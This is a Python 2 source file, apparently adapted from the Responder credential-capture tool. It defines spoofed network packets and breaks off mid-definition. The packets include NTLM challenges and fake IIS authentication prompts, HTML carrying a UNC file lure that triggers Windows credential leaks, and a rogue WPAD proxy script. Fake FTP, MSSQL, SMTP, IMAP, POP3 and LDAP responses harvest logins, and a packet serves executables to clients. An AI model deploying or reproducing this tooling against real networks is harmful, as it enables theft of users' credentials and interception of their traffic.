#!/usr/bin/env python
# This file is mainly cobblled together from Responder (https://github.com/SpiderLabs/Responder)
# Original work by Laurent Gaffie - Trustwave Holdings
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.

from SocketServer import BaseRequestHandler, StreamRequestHandler, TCPServer, UDPServer, ThreadingMixIn
import struct
from threading import Thread
import optparse
import ssl
import struct
from base64 import b64decode, b64encode
from UserDict import DictMixin
import time
import socket
import re
import os

hostedFiles = dict()

class OrderedDict(dict, DictMixin):

    def __init__(self, *args, **kwds):
        if len(args) > 1:
            raise TypeError('expected at most 1 arguments, got %d' % len(args))
        try:
            self.__end
        except AttributeError:
            self.clear()
        self.update(*args, **kwds)

    def clear(self):
        self.__end = end = []
        end += [None, end, end]
        self.__map = {}
        dict.clear(self)

    def __setitem__(self, key, value):
        if key not in self:
            end = self.__end
            curr = end[1]
            curr[2] = end[1] = self.__map[key] = [key, curr, end]
        dict.__setitem__(self, key, value)

    def __delitem__(self, key):
        dict.__delitem__(self, key)
        key, prev, next = self.__map.pop(key)
        prev[2] = next
        next[1] = prev

    def __iter__(self):
        end = self.__end
        curr = end[2]
        while curr is not end:
            yield curr[0]
            curr = curr[2]

    def __reversed__(self):
        end = self.__end
        curr = end[1]
        while curr is not end:
            yield curr[0]
            curr = curr[1]

    def popitem(self, last=True):
        if not self:
            raise KeyError('dictionary is empty')
        if last:
            key = reversed(self).next()
        else:
            key = iter(self).next()
        value = self.pop(key)
        return key, value

    def __reduce__(self):
        items = [[k, self[k]] for k in self]
        tmp = self.__map, self.__end
        del self.__map, self.__end
        inst_dict = vars(self).copy()
        self.__map, self.__end = tmp
        if inst_dict:
            return self.__class__, (items,), inst_dict
        return self.__class__, (items,)

    def keys(self):
        return list(self)

    setdefault = DictMixin.setdefault
    update = DictMixin.update
    pop = DictMixin.pop
    values = DictMixin.values
    items = DictMixin.items
    iterkeys = DictMixin.iterkeys
    itervalues = DictMixin.itervalues
    iteritems = DictMixin.iteritems

    def __repr__(self):
        if not self:
            return '%s()' % (self.__class__.__name__,)
        return '%s(%r)' % (self.__class__.__name__, self.items())

    def copy(self):
        return self.__class__(self)

    @classmethod
    def fromkeys(cls, iterable, value=None):
        d = cls()
        for key in iterable:
            d[key] = value
        return d

    def __eq__(self, other):
        if isinstance(other, OrderedDict):
            return len(self)==len(other) and \
                   min(p==q for p, q in  zip(self.items(), other.items()))
        return dict.__eq__(self, other)

    def __ne__(self, other):
        return not self == other

class Packet():
    fields = OrderedDict([
        ("data", ""),
    ])
    def __init__(self, **kw):
        self.fields = OrderedDict(self.__class__.fields)
        for k,v in kw.items():
            if callable(v):
                self.fields[k] = v(self.fields[k])
            else:
                self.fields[k] = v
    def __str__(self):
        return "".join(map(str, self.fields.values()))

##### HTTP Packets #####
class NTLM_Challenge(Packet):
    fields = OrderedDict([
        ("Signature",        "NTLMSSP"),
        ("SignatureNull",    "\x00"),
        ("MessageType",      "\x02\x00\x00\x00"),
        ("TargetNameLen",    "\x06\x00"),
        ("TargetNameMaxLen", "\x06\x00"),
        ("TargetNameOffset", "\x38\x00\x00\x00"),
        ("NegoFlags",        "\x05\x02\x89\xa2"),
        ("ServerChallenge",  ""),
        ("Reserved",         "\x00\x00\x00\x00\x00\x00\x00\x00"),
        ("TargetInfoLen",    "\x7e\x00"),
        ("TargetInfoMaxLen", "\x7e\x00"),
        ("TargetInfoOffset", "\x3e\x00\x00\x00"),
        ("NTLMOsVersion",    "\x05\x02\xce\x0e\x00\x00\x00\x0f"),
        ("TargetNameStr",    "SMB"),
        ("Av1",              "\x02\x00"),#nbt name
        ("Av1Len",           "\x06\x00"),
        ("Av1Str",           "SMB"),
        ("Av2",              "\x01\x00"),#Server name
        ("Av2Len",           "\x14\x00"),
        ("Av2Str",           "SMB-TOOLKIT"),
        ("Av3",              "\x04\x00"),#Full Domain name
        ("Av3Len",           "\x12\x00"),
        ("Av3Str",           "smb.local"),
        ("Av4",              "\x03\x00"),#Full machine domain name
        ("Av4Len",           "\x28\x00"),
        ("Av4Str",           "server2003.smb.local"),
        ("Av5",              "\x05\x00"),#Domain Forest Name
        ("Av5Len",           "\x12\x00"),
        ("Av5Str",           "smb.local"),
        ("Av6",              "\x00\x00"),#AvPairs Terminator
        ("Av6Len",           "\x00\x00"),
    ])

    def calculate(self):
        # First convert to unicode
        self.fields["TargetNameStr"] = self.fields["TargetNameStr"].encode('utf-16le')
        self.fields["Av1Str"] = self.fields["Av1Str"].encode('utf-16le')
        self.fields["Av2Str"] = self.fields["Av2Str"].encode('utf-16le')
        self.fields["Av3Str"] = self.fields["Av3Str"].encode('utf-16le')
        self.fields["Av4Str"] = self.fields["Av4Str"].encode('utf-16le')
        self.fields["Av5Str"] = self.fields["Av5Str"].encode('utf-16le')

        # Then calculate
        CalculateNameOffset = str(self.fields["Signature"])+str(self.fields["SignatureNull"])+str(self.fields["MessageType"])+str(self.fields["TargetNameLen"])+str(self.fields["TargetNameMaxLen"])+str(self.fields["TargetNameOffset"])+str(self.fields["NegoFlags"])+str(self.fields["ServerChallenge"])+str(self.fields["Reserved"])+str(self.fields["TargetInfoLen"])+str(self.fields["TargetInfoMaxLen"])+str(self.fields["TargetInfoOffset"])+str(self.fields["NTLMOsVersion"])
        CalculateAvPairsOffset = CalculateNameOffset+str(self.fields["TargetNameStr"])
        CalculateAvPairsLen = str(self.fields["Av1"])+str(self.fields["Av1Len"])+str(self.fields["Av1Str"])+str(self.fields["Av2"])+str(self.fields["Av2Len"])+str(self.fields["Av2Str"])+str(self.fields["Av3"])+str(self.fields["Av3Len"])+str(self.fields["Av3Str"])+str(self.fields["Av4"])+str(self.fields["Av4Len"])+str(self.fields["Av4Str"])+str(self.fields["Av5"])+str(self.fields["Av5Len"])+str(self.fields["Av5Str"])+str(self.fields["Av6"])+str(self.fields["Av6Len"])

        # Target Name Offsets
        self.fields["TargetNameOffset"] = struct.pack("<i", len(CalculateNameOffset))
        self.fields["TargetNameLen"] = struct.pack("<i", len(self.fields["TargetNameStr"]))[:2]
        self.fields["TargetNameMaxLen"] = struct.pack("<i", len(self.fields["TargetNameStr"]))[:2]
        # AvPairs Offsets
        self.fields["TargetInfoOffset"] = struct.pack("<i", len(CalculateAvPairsOffset))
        self.fields["TargetInfoLen"] = struct.pack("<i", len(CalculateAvPairsLen))[:2]
        self.fields["TargetInfoMaxLen"] = struct.pack("<i", len(CalculateAvPairsLen))[:2]
        # AvPairs StrLen
        self.fields["Av1Len"] = struct.pack("<i", len(str(self.fields["Av1Str"])))[:2]
        self.fields["Av2Len"] = struct.pack("<i", len(str(self.fields["Av2Str"])))[:2]
        self.fields["Av3Len"] = struct.pack("<i", len(str(self.fields["Av3Str"])))[:2]
        self.fields["Av4Len"] = struct.pack("<i", len(str(self.fields["Av4Str"])))[:2]
        self.fields["Av5Len"] = struct.pack("<i", len(str(self.fields["Av5Str"])))[:2]

class IIS_Auth_401_Ans(Packet):
    fields = OrderedDict([
        ("Code",          "HTTP/1.1 401 Unauthorized\r\n"),
        ("ServerType",    "Server: Microsoft-IIS/6.0\r\n"),
        ("Date",          "Date: Wed, 12 Sep 2012 13:06:55 GMT\r\n"),
        ("Type",          "Content-Type: text/html\r\n"),
        ("WWW-Auth",      "WWW-Authenticate: NTLM\r\n"),
        ("PoweredBy",     "X-Powered-By: ASP.NET\r\n"),
        ("Len",           "Content-Length: 0\r\n"),
        ("ConnClose",     "Connection: close\r\n"),
        ("CRLF",          "\r\n"),
    ])

class IIS_Auth_Granted(Packet):
    fields = OrderedDict([
        ("Code",          "HTTP/1.1 200 OK\r\n"),
        ("ServerType",    "Server: Microsoft-IIS/6.0\r\n"),
        ("Date",          "Date: Wed, 12 Sep 2012 13:06:55 GMT\r\n"),
        ("Type",          "Content-Type: text/html\r\n"),
        ("WWW-Auth",      "WWW-Authenticate: NTLM\r\n"),
        ("PoweredBy",     "X-Powered-By: ASP.NET\r\n"),
        ("ContentLen",    "Content-Length: "),
        ("ActualLen",     "76"),
        ("CRLF",          "\r\n\r\n"),
        ("Payload",       "<html>\n<head>\n</head>\n<body>\n<img src='file:\\\\\\\\\\\\shar\\smileyd.ico' alt='Loading' height='1' width='2'>\n</body>\n</html>\n"),
    ])
    def calculate(self):
        self.fields["ActualLen"] = len(str(self.fields["Payload"]))
class IIS_XML(Packet):
    fields = OrderedDict([
        ("Code",          "HTTP/1.1 200 OK\r\n"),
        ("ServerType",    "Server: Microsoft-IIS/6.0\r\n"),
        ("Date",          "Date: Wed, 12 Sep 2012 13:06:55 GMT\r\n"),
        ("Type",          "Content-Type: text/xml\r\n"),
        ("WWW-Auth",      "WWW-Authenticate: NTLM\r\n"),
        ("PoweredBy",     "X-Powered-By: ASP.NET\r\n"),
        ("ContentLen",    "Content-Length: "),
        ("ActualLen",     "76"),
        ("ConnClose",     "\r\nConnection: close\r\n"),
        ("CRLF",          "\r\n"),
        ("Payload",       "<html>\n<head>\n</head>\n<body>\n<img src='file:\\\\\\\\\\\\shar\\smileyd.ico' alt='Loading' height='1' width='2'>\n</body>\n</html>\n"),
    ])
    def calculate(self):
        self.fields["ActualLen"] = len(str(self.fields["Payload"]))

class IIS_ICO(Packet):
    fields = OrderedDict([
        ("Code",          "HTTP/1.1 200 OK\r\n"),
        ("ServerType",    "Server: Microsoft-IIS/6.0\r\n"),
        ("Date",          "Date: Wed, 12 Sep 2012 13:06:55 GMT\r\n"),
        ("Type",          "Content-Type: image/x-icon\r\n"),
        ("WWW-Auth",      "WWW-Authenticate: NTLM\r\n"),
        ("PoweredBy",     "X-Powered-By: ASP.NET\r\n"),
        ("ContentLen",    "Content-Length: "),
        ("ActualLen",     "76"),
        ("CRLF",          "\r\n\r\n"),
        ("Payload",       "<html>\n<head>\n</head>\n<body>\n<img src='file:\\\\\\\\\\\\shar\\smileyd.ico' alt='Loading' height='1' width='2'>\n</body>\n</html>\n"),
    ])
    def calculate(self):
        self.fields["ActualLen"] = len(self.fields["Payload"])

class IIS_RDP(Packet):
    fields = OrderedDict([
        ("Code",          "HTTP/1.1 200 OK\r\n"),
        ("ServerType",    "Server: Microsoft-IIS/6.0\r\n"),
        ("Date",          "Date: Wed, 12 Sep 2012 13:06:55 GMT\r\n"),
        ("Type",          "Content-Type: application/rdp\r\n"),
        ("WWW-Auth",      "WWW-Authenticate: NTLM\r\n"),
        ("PoweredBy",     "X-Powered-By: ASP.NET\r\n"),
        ("ContentLen",    "Content-Length: "),
        ("ActualLen",     "76"),
        ("CRLF",          "\r\n\r\n"),
        ("Payload",       "<html>\n<head>\n</head>\n<body>\n<img src='file:\\\\\\\\\\\\shar\\smileyd.ico' alt='Loading' height='1' width='2'>\n</body>\n</html>\n"),
    ])
    def calculate(self):
        self.fields["ActualLen"] = len(str(self.fields["Payload"]))



class IIS_NTLM_Challenge_Ans(Packet):
    fields = OrderedDict([
        ("Code",          "HTTP/1.1 401 Unauthorized\r\n"),
        ("ServerType",    "Server: Microsoft-IIS/6.0\r\n"),
        ("Date",          "Date: Wed, 12 Sep 2012 13:06:55 GMT\r\n"),
        ("Type",          "Content-Type: text/html\r\n"),
        ("WWWAuth",       "WWW-Authenticate: NTLM "),
        ("Payload",       ""),
        ("Payload-CRLF",  "\r\n"),
        ("PoweredBy",     "X-Powered-By: ASP.NC0CD7B7802C76736E9B26FB19BEB2D36290B9FF9A46EDDA5ET\r\n"),
        ("Len",           "Content-Length: 0\r\n"),
        ("ConnClose",     "Connection: close\r\n"),
        ("CRLF",          "\r\n"),
    ])

    def calculate(self,payload):
        self.fields["Payload"] = b64encode(payload)

class IIS_Basic_401_Ans(Packet):
    fields = OrderedDict([
        ("Code",          "HTTP/1.1 401 Unauthorized\r\n"),
        ("ServerType",    "Server: Microsoft-IIS/6.0\r\n"),
        ("Date",          "Date: Wed, 12 Sep 2012 13:06:55 GMT\r\n"),
        ("Type",          "Content-Type: text/html\r\n"),
        ("WWW-Auth",      "WWW-Authenticate: Basic realm=\"Authentication Required\"\r\n"),
        ("PoweredBy",     "X-Powered-By: ASP.NET\r\n"),
        ("AllowOrigin",   "Access-Control-Allow-Origin: *\r\n"),
        ("AllowCreds",    "Access-Control-Allow-Credentials: true\r\n"),
        ("Len",           "Content-Length: 0\r\n"),
        ("CRLF",          "\r\n"),
    ])

##### Proxy mode Packets #####
class WPADScript(Packet):
    fields = OrderedDict([
        ("Code",          "HTTP/1.1 200 OK\r\n"),
        ("ServerTlype",    "Server: Microsoft-IIS/6.0\r\n"),
        ("Date",          "Date: Wed, 12 Sep 2012 13:06:55 GMT\r\n"),
        ("Type",          "Content-Type: application/x-ns-proxy-autoconfig\r\n"),
        ("PoweredBy",     "X-Powered-By: ASP.NET\r\n"),
        ("ContentLen",    "Content-Length: "),
        ("ActualLen",     "76"),
        ("CRLF",          "\r\n\r\n"),
        ("Payload",       "function FindProxyForURL(url, host){return 'PROXY wpadwpadwpad:3141; DIRECT';}"),
    ])
    def calculate(self):
        self.fields["ActualLen"] = len(str(self.fields["Payload"]))

class ServeExeFile(Packet):
    fields = OrderedDict([
        ("Code",          "HTTP/1.1 200 OK\r\n"),
        ("ContentType",   "Content-Type: application/octet-stream\r\n"),
        ("LastModified",  "Last-Modified: Wed, 24 Nov 2010 00:39:06 GMT\r\n"),
        ("AcceptRanges",  "Accept-Ranges: bytes\r\n"),
        ("Server",        "Server: Microsoft-IIS/7.5\r\n"),
        ("PoweredBy",     "X-Powered-By: ASP.NET\r\n"),
        ("ContentDisp",   "Content-Disposition: attachment; filename="),
        ("ContentDiFile", ""),
        ("FileCRLF",      ";\r\n"),
        ("ContentLen",    "Content-Length: "),
        ("ActualLen",     "76"),
        ("Date",          "\r\nDate: Thu, 24 Oct 2013 22:35:46 GMT\r\n"),
        ("Connection",    "Connection: keep-alive\r\n"),
        ("X-CCC",         "US\r\n"),
        ("X-CID",         "2\r\n"),
        ("CRLF",          "\r\n"),
        ("Payload",       "jj"),
    ])
    def calculate(self):
        self.fields["ActualLen"] = len(str(self.fields["Payload"]))

class ServeHtmlFile(Packet):
    fields = OrderedDict([
        ("Code",          "HTTP/1.1 200 OK\r\n"),
        ("ContentType",   "Content-Type: text/html\r\n"),
        ("LastModified",  "Last-Modified: Wed, 24 Nov 2010 00:39:06 GMT\r\n"),
        ("AcceptRanges",  "Accept-Ranges: bytes\r\n"),
        ("Server",        "Server: Microsoft-IIS/7.5\r\n"),
        ("PoweredBy",     "X-Powered-By: ASP.NET\r\n"),
        ("ContentLen",    "Content-Length: "),
        ("ActualLen",     "76"),
        ("Date",          "\r\nDate: Thu, 24 Oct 2013 22:35:46 GMT\r\n"),
        ("Connection",    "Connection: keep-alive\r\n"),
        ("CRLF",          "\r\n"),
        ("Payload",       "jj"),
    ])
    def calculate(self):
        self.fields["ActualLen"] = len(str(self.fields["Payload"]))

##### FTP Packets #####
class FTPPacket(Packet):
    fields = OrderedDict([
        ("Code",           "220"),
        ("Separator",      "\x20"),
        ("Message",        "Welcome"),
        ("Terminator",     "\x0d\x0a"),
    ])

##### SQL Packets #####
class MSSQLPreLoginAnswer(Packet):
    fields = OrderedDict([
        ("PacketType",       "\x04"),
        ("Status",           "\x01"),
        ("Len",              "\x00\x25"),
        ("SPID",             "\x00\x00"),
        ("PacketID",         "\x01"),
        ("Window",           "\x00"),
        ("TokenType",        "\x00"),
        ("VersionOffset",    "\x00\x15"),
        ("VersionLen",       "\x00\x06"),
        ("TokenType1",       "\x01"),
        ("EncryptionOffset", "\x00\x1b"),
        ("EncryptionLen",    "\x00\x01"),
        ("TokenType2",       "\x02"),
        ("InstOptOffset",    "\x00\x1c"),
        ("InstOptLen",       "\x00\x01"),
        ("TokenTypeThrdID",  "\x03"),
        ("ThrdIDOffset",     "\x00\x1d"),
        ("ThrdIDLen",        "\x00\x00"),
        ("ThrdIDTerminator", "\xff"),
        ("VersionStr",       "\x09\x00\x0f\xc3"),
        ("SubBuild",         "\x00\x00"),
        ("EncryptionStr",    "\x02"),
        ("InstOptStr",       "\x00"),
    ])

    def calculate(self):
        CalculateCompletePacket = str(self.fields["PacketType"])+str(self.fields["Status"])+str(self.fields["Len"])+str(self.fields["SPID"])+str(self.fields["PacketID"])+str(self.fields["Window"])+str(self.fields["TokenType"])+str(self.fields["VersionOffset"])+str(self.fields["VersionLen"])+str(self.fields["TokenType1"])+str(self.fields["EncryptionOffset"])+str(self.fields["EncryptionLen"])+str(self.fields["TokenType2"])+str(self.fields["InstOptOffset"])+str(self.fields["InstOptLen"])+str(self.fields["TokenTypeThrdID"])+str(self.fields["ThrdIDOffset"])+str(self.fields["ThrdIDLen"])+str(self.fields["ThrdIDTerminator"])+str(self.fields["VersionStr"])+str(self.fields["SubBuild"])+str(self.fields["EncryptionStr"])+str(self.fields["InstOptStr"])
        VersionOffset = str(self.fields["TokenType"])+str(self.fields["VersionOffset"])+str(self.fields["VersionLen"])+str(self.fields["TokenType1"])+str(self.fields["EncryptionOffset"])+str(self.fields["EncryptionLen"])+str(self.fields["TokenType2"])+str(self.fields["InstOptOffset"])+str(self.fields["InstOptLen"])+str(self.fields["TokenTypeThrdID"])+str(self.fields["ThrdIDOffset"])+str(self.fields["ThrdIDLen"])+str(self.fields["ThrdIDTerminator"])
        EncryptionOffset = VersionOffset+str(self.fields["VersionStr"])+str(self.fields["SubBuild"])
        InstOpOffset = EncryptionOffset+str(self.fields["EncryptionStr"])
        ThrdIDOffset = InstOpOffset+str(self.fields["InstOptStr"])

        self.fields["Len"] = struct.pack(">h",len(CalculateCompletePacket))
        #Version
        self.fields["VersionLen"] = struct.pack(">h",len(self.fields["VersionStr"]+self.fields["SubBuild"]))
        self.fields["VersionOffset"] = struct.pack(">h",len(VersionOffset))
        #Encryption
        self.fields["EncryptionLen"] = struct.pack(">h",len(self.fields["EncryptionStr"]))
        self.fields["EncryptionOffset"] = struct.pack(">h",len(EncryptionOffset))
        #InstOpt
        self.fields["InstOptLen"] = struct.pack(">h",len(self.fields["InstOptStr"]))
        self.fields["EncryptionOffset"] = struct.pack(">h",len(InstOpOffset))
        #ThrdIDOffset
        self.fields["ThrdIDOffset"] = struct.pack(">h",len(ThrdIDOffset))

class MSSQLNTLMChallengeAnswer(Packet):
    fields = OrderedDict([
        ("PacketType",       "\x04"),
        ("Status",           "\x01"),
        ("Len",              "\x00\xc7"),
        ("SPID",             "\x00\x00"),
        ("PacketID",         "\x01"),
        ("Window",           "\x00"),
        ("TokenType",        "\xed"),
        ("SSPIBuffLen",      "\xbc\x00"),
        ("Signature",        "NTLMSSP"),
        ("SignatureNull",    "\x00"),
        ("MessageType",      "\x02\x00\x00\x00"),
        ("TargetNameLen",    "\x06\x00"),
        ("TargetNameMaxLen", "\x06\x00"),
        ("TargetNameOffset", "\x38\x00\x00\x00"),
        ("NegoFlags",        "\x05\x02\x89\xa2"),
        ("ServerChallenge",  ""),
        ("Reserved",         "\x00\x00\x00\x00\x00\x00\x00\x00"),
        ("TargetInfoLen",    "\x7e\x00"),
        ("TargetInfoMaxLen", "\x7e\x00"),
        ("TargetInfoOffset", "\x3e\x00\x00\x00"),
        ("NTLMOsVersion",    "\x05\x02\xce\x0e\x00\x00\x00\x0f"),
        ("TargetNameStr",    "SMB"),
        ("Av1",              "\x02\x00"),#nbt name
        ("Av1Len",           "\x06\x00"),
        ("Av1Str",           "SMB"),
        ("Av2",              "\x01\x00"),#Server name
        ("Av2Len",           "\x14\x00"),
        ("Av2Str",           "SMB-TOOLKIT"),
        ("Av3",              "\x04\x00"),#Full Domain name
        ("Av3Len",           "\x12\x00"),
        ("Av3Str",           "smb.local"),
        ("Av4",              "\x03\x00"),#Full machine domain name
        ("Av4Len",           "\x28\x00"),
        ("Av4Str",           "server2003.smb.local"),
        ("Av5",              "\x05\x00"),#Domain Forest Name
        ("Av5Len",           "\x12\x00"),
        ("Av5Str",           "smb.local"),
        ("Av6",              "\x00\x00"),#AvPairs Terminator
        ("Av6Len",           "\x00\x00"),
    ])

    def calculate(self):
        # First convert to unicode
        self.fields["TargetNameStr"] = self.fields["TargetNameStr"].encode('utf-16le')
        self.fields["Av1Str"] = self.fields["Av1Str"].encode('utf-16le')
        self.fields["Av2Str"] = self.fields["Av2Str"].encode('utf-16le')
        self.fields["Av3Str"] = self.fields["Av3Str"].encode('utf-16le')
        self.fields["Av4Str"] = self.fields["Av4Str"].encode('utf-16le')
        self.fields["Av5Str"] = self.fields["Av5Str"].encode('utf-16le')

        # Then calculate
        CalculateCompletePacket = str(self.fields["PacketType"])+str(self.fields["Status"])+str(self.fields["Len"])+str(self.fields["SPID"])+str(self.fields["PacketID"])+str(self.fields["Window"])+str(self.fields["TokenType"])+str(self.fields["SSPIBuffLen"])+str(self.fields["Signature"])+str(self.fields["SignatureNull"])+str(self.fields["MessageType"])+str(self.fields["TargetNameLen"])+str(self.fields["TargetNameMaxLen"])+str(self.fields["TargetNameOffset"])+str(self.fields["NegoFlags"])+str(self.fields["ServerChallenge"])+str(self.fields["Reserved"])+str(self.fields["TargetInfoLen"])+str(self.fields["TargetInfoMaxLen"])+str(self.fields["TargetInfoOffset"])+str(self.fields["NTLMOsVersion"])+str(self.fields["TargetNameStr"])+str(self.fields["Av1"])+str(self.fields["Av1Len"])+str(self.fields["Av1Str"])+str(self.fields["Av2"])+str(self.fields["Av2Len"])+str(self.fields["Av2Str"])+str(self.fields["Av3"])+str(self.fields["Av3Len"])+str(self.fields["Av3Str"])+str(self.fields["Av4"])+str(self.fields["Av4Len"])+str(self.fields["Av4Str"])+str(self.fields["Av5"])+str(self.fields["Av5Len"])+str(self.fields["Av5Str"])+str(self.fields["Av6"])+str(self.fields["Av6Len"])
        CalculateSSPI = str(self.fields["Signature"])+str(self.fields["SignatureNull"])+str(self.fields["MessageType"])+str(self.fields["TargetNameLen"])+str(self.fields["TargetNameMaxLen"])+str(self.fields["TargetNameOffset"])+str(self.fields["NegoFlags"])+str(self.fields["ServerChallenge"])+str(self.fields["Reserved"])+str(self.fields["TargetInfoLen"])+str(self.fields["TargetInfoMaxLen"])+str(self.fields["TargetInfoOffset"])+str(self.fields["NTLMOsVersion"])+str(self.fields["TargetNameStr"])+str(self.fields["Av1"])+str(self.fields["Av1Len"])+str(self.fields["Av1Str"])+str(self.fields["Av2"])+str(self.fields["Av2Len"])+str(self.fields["Av2Str"])+str(self.fields["Av3"])+str(self.fields["Av3Len"])+str(self.fields["Av3Str"])+str(self.fields["Av4"])+str(self.fields["Av4Len"])+str(self.fields["Av4Str"])+str(self.fields["Av5"])+str(self.fields["Av5Len"])+str(self.fields["Av5Str"])+str(self.fields["Av6"])+str(self.fields["Av6Len"])
        CalculateNameOffset = str(self.fields["Signature"])+str(self.fields["SignatureNull"])+str(self.fields["MessageType"])+str(self.fields["TargetNameLen"])+str(self.fields["TargetNameMaxLen"])+str(self.fields["TargetNameOffset"])+str(self.fields["NegoFlags"])+str(self.fields["ServerChallenge"])+str(self.fields["Reserved"])+str(self.fields["TargetInfoLen"])+str(self.fields["TargetInfoMaxLen"])+str(self.fields["TargetInfoOffset"])+str(self.fields["NTLMOsVersion"])
        CalculateAvPairsOffset = CalculateNameOffset+str(self.fields["TargetNameStr"])
        CalculateAvPairsLen = str(self.fields["Av1"])+str(self.fields["Av1Len"])+str(self.fields["Av1Str"])+str(self.fields["Av2"])+str(self.fields["Av2Len"])+str(self.fields["Av2Str"])+str(self.fields["Av3"])+str(self.fields["Av3Len"])+str(self.fields["Av3Str"])+str(self.fields["Av4"])+str(self.fields["Av4Len"])+str(self.fields["Av4Str"])+str(self.fields["Av5"])+str(self.fields["Av5Len"])+str(self.fields["Av5Str"])+str(self.fields["Av6"])+str(self.fields["Av6Len"])

        self.fields["Len"] = struct.pack(">h",len(CalculateCompletePacket))
        self.fields["SSPIBuffLen"] = struct.pack("<i",len(CalculateSSPI))[:2]
        # Target Name Offsets
        self.fields["TargetNameOffset"] = struct.pack("<i", len(CalculateNameOffset))
        self.fields["TargetNameLen"] = struct.pack("<i", len(self.fields["TargetNameStr"]))[:2]
        self.fields["TargetNameMaxLen"] = struct.pack("<i", len(self.fields["TargetNameStr"]))[:2]
        # AvPairs Offsets
        self.fields["TargetInfoOffset"] = struct.pack("<i", len(CalculateAvPairsOffset))
        self.fields["TargetInfoLen"] = struct.pack("<i", len(CalculateAvPairsLen))[:2]
        self.fields["TargetInfoMaxLen"] = struct.pack("<i", len(CalculateAvPairsLen))[:2]
        # AvPairs StrLen
        self.fields["Av1Len"] = struct.pack("<i", len(str(self.fields["Av1Str"])))[:2]
        self.fields["Av2Len"] = struct.pack("<i", len(str(self.fields["Av2Str"])))[:2]
        self.fields["Av3Len"] = struct.pack("<i", len(str(self.fields["Av3Str"])))[:2]
        self.fields["Av4Len"] = struct.pack("<i", len(str(self.fields["Av4Str"])))[:2]
        self.fields["Av5Len"] = struct.pack("<i", len(str(self.fields["Av5Str"])))[:2]

##### SMTP Packets #####
class SMTPGreeting(Packet):
    fields = OrderedDict([
        ("Code",       "220"),
        ("Separator",  "\x20"),
        ("Message",    "smtp01.local ESMTP"),
        ("CRLF",       "\x0d\x0a"),
    ])

class SMTPAUTH(Packet):
    fields = OrderedDict([
        ("Code0",      "250"),
        ("Separator0", "\x2d"),
        ("Message0",   "smtp01.local"),
        ("CRLF0",      "\x0d\x0a"),
        ("Code",       "250"),
        ("Separator",  "\x20"),
        ("Message",    "AUTH LOGIN PLAIN XYMCOOKIE"),
        ("CRLF",       "\x0d\x0a"),
    ])

class SMTPAUTH1(Packet):
    fields = OrderedDict([
        ("Code",       "334"),
        ("Separator",  "\x20"),
        ("Message",    "VXNlcm5hbWU6"),#Username
        ("CRLF",       "\x0d\x0a"),

    ])

class SMTPAUTH2(Packet):
    fields = OrderedDict([
        ("Code",       "334"),
        ("Separator",  "\x20"),
        ("Message",    "UGFzc3dvcmQ6"),#Password
        ("CRLF",       "\x0d\x0a"),
    ])

##### IMAP Packets #####
class IMAPGreeting(Packet):
    fields = OrderedDict([
        ("Code",     "* OK IMAP4 service is ready."),
        ("CRLF",     "\r\n"),
    ])

class IMAPCapability(Packet):
    fields = OrderedDict([
        ("Code",     "* CAPABILITY IMAP4 IMAP4rev1 AUTH=PLAIN"),
        ("CRLF",     "\r\n"),
    ])

class IMAPCapabilityEnd(Packet):
    fields = OrderedDict([
        ("Tag",     ""),
        ("Message", " OK CAPABILITY completed."),
        ("CRLF",    "\r\n"),
    ])

##### POP3 Packets #####
class POPOKPacket(Packet):
    fields = OrderedDict([
        ("Code",  "+OK"),
        ("CRLF",  "\r\n"),
    ])

##### LDAP Packets #####
class LDAPSearchDefaultPacket(Packet):
    fields = OrderedDict([
        ("ParserHeadASNID",          "\x30"),
        ("ParserHeadASNLen",         "\x0c"),
        ("MessageIDASNID",           "\x02"),
        ("MessageIDASNLen",          "\x01"),
        ("MessageIDASNStr",          "\x0f"),
        ("OpHeadASNID",              "\x65"),
        ("OpHeadASNIDLen",           "\x07"),
        ("SearchDoneSuccess",        "\x0A\x01\x00\x04\x00\x04\x00"),#No Results.
    ])

class LDAPSearchSupportedCapabilitiesPacket(Packet):
    fields = OrderedDict([
        ("ParserHeadASNID",          "\x30"),
        ("ParserHeadASNLenOfLen",    "\x84"),
        ("ParserHeadASNLen",         "\x00\x00\x00\x7e"),#126
        ("MessageIDASNID",           "\x02"),
        ("MessageIDASNLen",          "\x01"),
        ("MessageIDASNStr",          "\x02"),
        ("OpHeadASNID",              "\x64"),
        ("OpHeadASNIDLenOfLen",      "\x84"),
        ("OpHeadASNIDLen",           "\x00\x00\x00\x75"),#117
        ("ObjectName",               "\x04\x00"),
        ("SearchAttribASNID",        "\x30"),
        ("SearchAttribASNLenOfLen",  "\x84"),
        ("SearchAttribASNLen",       "\x00\x00\x00\x6d"),#109
        ("SearchAttribASNID1",       "\x30"),
        ("SearchAttribASN1LenOfLen", "\x84"),
        ("SearchAttribASN1Len",      "\x00\x00\x00\x67"),#103
        ("SearchAttribASN2ID",       "\x04"),
        ("SearchAttribASN2Len",      "\x15"),#21
        ("SearchAttribASN2Str",      "supportedCapabilities"),
        ("SearchAttribASN3ID",       "\x31"),
        ("SearchAttribASN3LenOfLen", "\x84"),
        ("SearchAttribASN3Len",      "\x00\x00\x00\x4a"),
        ("SearchAttrib1ASNID",       "\x04"),
        ("SearchAttrib1ASNLen",      "\x16"),#22
        ("SearchAttrib1ASNStr",      "1.2.840.113556.1.4.800"),
        ("SearchAttrib2ASNID",       "\x04"),
        ("SearchAttrib2ASNLen",      "\x17"),#23
        ("SearchAttrib2ASNStr",      "1.2.840.113556.1.4.1670"),
        ("SearchAttrib3ASNID",       "\x04"),
        ("SearchAttrib3ASNLen",      "\x17"),#23
        ("SearchAttrib3ASNStr",      "1.2.840.113556.1.4.1791"),
        ("SearchDoneASNID",          "\x30"),
        ("SearchDoneASNLenOfLen",    "\x84"),
        ("SearchDoneASNLen",         "\x00\x00\x00\x10"),#16
        ("MessageIDASN2ID",          "\x02"),
        ("MessageIDASN2Len",         "\x01"),
        ("MessageIDASN2Str",         "\x02"),
        ("SearchDoneStr",            "\x65\x84\x00\x00\x00\x07\x0a\x01\x00\x04\x00\x04\x00"),
        ## No need to calculate anything this time, this packet is generic.
    ])

class LDAPSearchSupportedMechanismsPacket(Packet):
    fields = OrderedDict([
        ("ParserHeadASNID",          "\x30"),
        ("ParserHeadASNLenOfLen",    "\x84"),
